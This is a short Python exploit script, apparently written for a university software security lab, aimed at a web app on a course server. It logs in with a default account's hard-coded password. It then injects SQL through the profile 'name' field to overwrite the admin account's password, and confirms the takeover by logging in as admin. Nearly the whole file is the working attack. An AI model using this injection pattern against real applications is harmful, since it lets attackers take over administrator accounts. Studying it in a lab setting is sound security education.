import requests, random 

Server = 'http://a40ff75cdce02380039a825884964b5e117af09561845c13679abcb87fe4.project.ssof.rnl.tecnico.ulisboa.pt'
session = requests.session()

# Default account: investor
user = "investor"
password = "benfica123"

# Default account: ssofadmin
otheruser = "ssofadmin"

salt = str(random.randint(2 ** 27, 2 ** 28)) 
newpassword = "password"+salt 

#Login
params = {'username' : user, 'password' : password }
r = session.post(Server + '/login', data=params)

headers = {'user-agent': 'my-app/0.0.1', 'Content-Type': 'application/json'}
params = {}
r = requests.get(Server + '/profile', params=params, headers=headers, cookies = session.cookies)

#Update Profile
files = {'photo': '(binary)'}

params = {'name': "',  username = '" + otheruser + "', password = '" + newpassword + "' where username = '" + otheruser + "' -- '", 'currentpassword': password, 'newpassword': password, 'about': ""  }
r = session.post(Server + '/update_profile', files = files , data = params, cookies = session.cookies)

#Login with new password
params = {'username' : otheruser, 'password' : newpassword }
r = session.post(Server + '/login', data=params)

assert "Welcome" in r.text
print('Login was successful')